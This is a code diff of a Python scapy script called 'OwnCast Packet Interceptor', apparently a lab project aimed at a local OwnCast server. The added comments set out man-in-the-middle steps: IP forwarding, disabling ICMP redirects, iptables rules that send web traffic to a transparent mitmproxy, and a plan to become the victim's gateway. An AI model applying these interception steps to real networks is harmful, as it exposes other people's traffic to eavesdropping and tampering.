@@ -2,11 +2,12 @@ import ipaddress
 from getmac import get_mac_address as gma
 from scapy.all import *
 from scapy.layers.http import *
-import sys
 import argparse
-import time
 from scapy.layers.l2 import *
 import threading
+
+# https://mitmproxy.org/
+# https://docs.mitmproxy.org/stable/howto-transparent/
 
 # NOTES #
 # Run the following command in your Linux terminal:
@@ -15,7 +16,25 @@ import threading
 # this means that a MITM attack will disable communication between victim and host
 # Change this setting with:
 # sudo sysctl -w net.ipv4.ip_forward=1
+# sudo sysctl -w net.ipv6.conf.all.forwarding=1
 
+# We also need to block icmp redirects
+# sudo sysctl -w .net.ipv4.conf.all.send_redirects=0
+
+# Set up proxying
+# sudo iptables -t nat -A PREROUTING -i enp0s8 -p tcp --dport 80 -j REDIRECT --to-port 8080
+# sudo iptables -t nat -A PREROUTING -i enp0s8 -p tcp --dport 443 -j REDIRECT --to-port 8080
+# sudo ip6tables -t nat -A PREROUTING -i enp0s8 -p tcp --dport 80 -j REDIRECT --to-port 8080
+# sudo ip6tables -t nat -A PREROUTING -i enp0s8 -p tcp --dport 443 -j REDIRECT --to-port 8080
+
+# Start up MITM Proxy
+# sudo /home/owncast/Documents/mitmproxy/mitmproxy --mode transparent --showhost
+
+# TODO; become default gateway for victim machine
+# TODO; set up custom proxy ruleset for mitmproxy
+# TODO; cry
+
+# Read parser data
 parser = argparse.ArgumentParser(description="OwnCast Packet Interceptor")
 parser.add_argument("-host", default="192.168.56.106")  # Original OwnCast server
 parser.add_argument("-port", default="8080")  # Port of original OwnCast server
